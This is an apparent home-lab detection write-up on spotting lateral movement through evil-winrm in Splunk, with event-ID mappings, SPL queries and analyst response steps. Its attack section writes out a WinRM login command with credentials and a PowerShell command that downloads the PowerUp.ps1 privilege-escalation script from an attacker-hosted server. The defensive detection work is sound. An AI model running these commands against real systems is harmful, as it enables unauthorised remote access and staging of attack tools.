

# Detection Usecase 2 : Lateral Movement via evil-winrm


# Scenario Summary: 
Monitoring a non-admin user tries to login to the system through evil-winrm(Kali Linux Tool - Subsitute of Psexec) and attempted to move laterally in the system by downloading the POwerUp.ps1 Tool.

# Attack Steps:

Here, Virtual Wiindows 11 is the victim where universal forwarder is running,  
and  Virtual Kali Linux is the attacker.
- The Attack was simulated by Kali Linux as follows:  

1) Attacker got a powershell prommpt by connecting to Victim Machine via Evil-winrm Tool:  
```
evil-winrm -i 192.168.0.101 -u sshuser -p pass
```  
2) After getting the powershell terminal , downloads the PowerUp.ps1 Tool in the System.  
```
Invoke-WebRequest -URI http://192.168.0.106:8888/Powerup.ps1 -Outfile C:\Users\sshuser\powerup.ps1
```

Tools Used:  
-Attacking Tool : evil-winrm.
-SIEM : Splunk Free  
-Log Source : Windows Security Event Logs, Sysmon


# Event ID / Data Source Mapping:

| Source                    | EventCode | Description                      |
|---------------------------|-----------|----------------------------------|
| WinEventLog : Security    | 4624      | Successfully Logged On           |
| WinEventLog : Security    | 5156      | A Connection was permitted       |
| WinEventLog : Sysmon      | 11        | File Creation                    |


# Detection Query / Logic:
```spl 
- Search : Login
index=* EventCode=4624 
```  
```spl 
- Search : Powershell Remoting 
index=* EventCode=5156 wsmprovhost.exe
```

# Sample Alert Screenshot

1) Attacker Login with WinRM:

![login](<logs/Screenshot 2025-05-29 094752.png>)  
![login0](<logs/Screenshot 2025-05-29 100116.png>)  
![login2](<logs/Screenshot 2025-05-29 094905.png>)

2) Attacker has downloaded a file PowerUp.ps1:  

![file](<logs/Screenshot 2025-05-29 094948.png>)

3) Alert

![alert](<logs/Screenshot 2025-05-29 102442.png>)

# Analyst Notes / Recommendations:

1) What Should an Analyst do ? 

-> Investigate the Source IP and user. Check if the account has access to login remotely.   
-> If unauthorized logged-in is perform then try to disable the account from the System.  
-> Correlate evemts related to the disabled account, find for any malicious downloads and delete all files.  
-> Make an alert if some non-admin tries to connect remotely to the system.  
-> Preserve the Evidence & Trigger the incident response.  
-> Report & Document.

# Detection Status

 -> Successfully Detected.  
 -> Alert Successfully.


